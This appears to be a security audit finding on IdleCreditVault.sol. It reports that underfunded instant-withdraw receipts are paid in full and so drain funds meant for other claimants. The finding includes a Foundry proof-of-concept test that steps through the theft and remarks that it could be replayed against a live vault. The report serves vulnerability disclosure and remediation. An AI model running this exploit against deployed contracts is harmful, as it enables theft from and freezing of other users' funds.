### Title
Instant-withdraw claims pay the full receipt while `collectInstantWithdrawFunds` only funds the actual collected amount - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`requestInstantWithdraw` mints the user a receipt for the full requested `_amount` and increments `pendingInstantWithdraws` by that same full amount. `collectInstantWithdrawFunds` decrements `pendingInstantWithdraws` only by the `_amount` the CDO actually collected — the code itself documents `pendingInstantWithdraws` as the "still-unfunded remainder", i.e. partial funding is an accepted state. However `claimInstantWithdrawRequest` pays `instantWithdrawsRequests[_user]` in full with no check that the receipt was ever funded. This is the exact analog of `stakedButUnverifiedNativeETH`: a liability counter is booked at the requested amount but settled at the actual amount, while the claim path ignores the gap — so funded assets are overdrawn and later claimants' receipts become unpayable.

### Finding Description
- `requestInstantWithdraw` mints `_amount` receipt tokens to the user and does `pendingInstantWithdraws += _amount` (contracts/strategies/idle/IdleCreditVault.sol:356-374).
- `collectInstantWithdrawFunds` does `pendingInstantWithdraws -= _amount` where `_amount` is whatever the CDO managed to pull, which can be strictly less than the outstanding requests (lines 398-403).
- `claimInstantWithdrawRequest` then does `amount = instantWithdrawsRequests[_user]; _burn(_user, amount); _transferFundedClaim(_user, amount)` (lines 381-393) — paying the *full* receipt, not the funded portion.
- `_transferFundedClaim` only protects `defaultRecoveryReserve` (lines 897-907); it does not isolate funds collected for other users' instant or normal receipts. So an under-funded instant claim is paid out of cash collected for other claimants, leaving the strategy insolvent for them.

Invariant broken: one receipt, one payout — a receipt should only pay out assets actually collected for it. Here receipts are denominated at request amount but funded at actual amount, and the shortfall is silently socialized onto later claimants.

### Impact Explanation
Direct theft plus insolvency. Any whitelisted tranche holder can open an instant withdraw request. If the CDO collects less than the aggregate pending (e.g. because the honest borrower has drawn liquidity and `getInstantWithdrawFunds` can only source part of it), the first claimer redeems their full receipt, consuming funds collected for other users. Later claimants' `claimInstantWithdrawRequest` calls revert on the token transfer (or on the reserve guard), permanently freezing their valid receipts. Attacker gain: up to their full receipt amount while only fractionally funded; victim loss: up to 100% of their pending instant receipts.

### Likelihood Explanation
Requires only that the CDO collects less underlying than the sum of outstanding instant requests before claims are processed — precisely the state the "unfunded remainder" accounting was designed to represent (see `defaultPendingClaimBasis` / `_defaultPrefundedInstantReserve`, lines 644-649 and 716-723, which explicitly acknowledge `pendingInstantWithdraws` as an unfunded remainder). An attacker can force this by requesting instant withdrawals when free liquidity is known to be short during an active epoch with outstanding borrower draws, then claiming first. No privileged action or misbehavior is needed beyond normal liquidity constraints.

### Recommendation
Track funded vs unfunded instant claims per user (or proportionally). Either:
- make `claimInstantWithdrawRequest` pay only `min(instantWithdrawsRequests[_user], userShareOfCollectedFunds)` and keep the remainder pending, or
- record per-epoch funded ratios for instant receipts (mirroring `lossRecoveryPriceByEpoch`) and pay `receipt * fundedRatio`, or
- have `collectInstantWithdrawFunds` mark receipts funded FIFO and revert claims on unfunded receipts until collection completes.

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../contracts/strategies/idle/IdleCreditVault.sol";
import "../../contracts/mocks/MockERC20.sol";

contract InstantWithdrawUnderfundedPoC is Test {
    IdleCreditVault strategy;
    MockERC20 usdc;
    address cdo     = address(0xCD0);
    address alice   = address(0xA11CE); // attacker
    address bob     = address(0xB0B);   // victim

    function setUp() public {
        usdc = new MockERC20("USDC", "USDC", 6);
        strategy = new IdleCreditVault();
        strategy.initialize(
            address(usdc), address(this), address(this),
            address(0xB0), "B0", 5e18
        );
        vm.prank(address(this));
        strategy.setWhitelistedCDO(cdo);
    }

    function test_UnderfundedInstantReceiptStealsOtherClaimsFunds() public {
        // Alice and Bob each request an instant withdraw of 100 USDC.
        vm.startPrank(cdo);
        strategy.requestInstantWithdraw(100e6, alice);
        strategy.requestInstantWithdraw(100e6, bob);
        vm.stopPrank();
        assertEq(strategy.pendingInstantWithdraws(), 200e6);

        // CDO only manages to collect 100 USDC total (borrower liquidity short).
        usdc.mint(cdo, 100e6);
        vm.startPrank(cdo);
        usdc.approve(address(strategy), 100e6);
        strategy.collectInstantWithdrawFunds(100e6); // only half of pending funded
        vm.stopPrank();
        assertEq(strategy.pendingInstantWithdraws(), 100e6);

        // Alice claims FIRST and receives her FULL 100 receipt,
        // consuming the entire collected pot (fair share was 50).
        vm.prank(cdo);
        strategy.claimInstantWithdrawRequest(alice);
        assertEq(usdc.balanceOf(alice), 100e6);

        // Bob's fully valid 100 receipt is now unpayable: strategy balance is 0.
        vm.prank(cdo);
        vm.expectRevert(); // safeTransfer fails / NotAllowed
        strategy.claimInstantWithdrawRequest(bob);
    }
}
```

Run: `forge test --match-test test_UnderfundedInstantReceiptStealsOtherClaimsFunds -vv`. (A fork variant can replay this against a live vault whose borrower has drawn most liquidity.)